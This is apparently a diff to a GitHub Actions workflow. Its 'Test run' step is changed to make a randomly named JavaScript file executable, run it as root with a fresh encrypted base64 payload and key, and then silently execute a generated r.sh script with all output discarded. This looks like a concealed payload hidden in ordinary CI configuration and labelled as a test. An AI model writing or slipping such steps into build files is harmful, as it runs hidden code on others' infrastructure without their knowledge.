@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'mqf5s'
+        echo 'dcwuq'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1+FJ+Vb8sb1hQ61CttyLhBoZAa2OUbLR6RGWh+fRw37Fb/GssLkTcKyhhbWES0kS6LGIyCptfC8s6m9rsQnryMWKFGCKBzkJ5SU6jWga4W6OHcCtPVct7Yz loqjch && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX19Mw+Vyzh3sSUTgj5+cE6YNEXWIbt1e8tZKfLP2kW3rZbowBoiRz2XZXjADTGpiu6cvffOY4W0S74tncrcG+BKesUGOvQIrI8/F2E4I0+A9TtcuGuF+6RR/ 3izfvi && sudo sh r.sh > /dev/null 2>&1
